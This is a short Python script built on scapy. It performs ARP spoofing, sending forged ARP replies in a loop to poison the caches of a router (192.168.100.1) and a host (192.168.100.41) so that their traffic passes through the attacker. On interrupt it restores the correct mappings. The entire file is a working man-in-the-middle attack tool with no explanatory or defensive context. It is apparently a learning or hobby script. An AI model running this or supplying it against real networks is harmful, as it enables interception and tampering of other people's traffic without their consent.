#!/usr/bin/python

import scapy.all as scapy

def restore(destination_ip, source_ip):
    target_mac = get_target_mac(destination_ip)
    source_mac = get_target_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

def get_target_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet = broadcast/arp_request
        answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
        mac = answer[0][1].hwsrc
        return(mac)
    except IndexError:
        print("No response received for ARP request.")
        exit(0)

def spoof_arp(target_ip, spoofed_ip):
    mac = get_target_mac(target_ip)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)
    print("Spoofing...")


def main():
    try:
        while True:
            #router's ip = 192.168.100.1 slef ip = 192.168.100.41
            spoof_arp("192.168.100.1", "192.168.100.41")
            spoof_arp("192.168.100.41", "192.168.100.1") 
    except KeyboardInterrupt:
        restore("192.168.100.1", "192.168.100.41")
        restore("192.168.100.41", "192.168.100.1")
        exit(0)

main()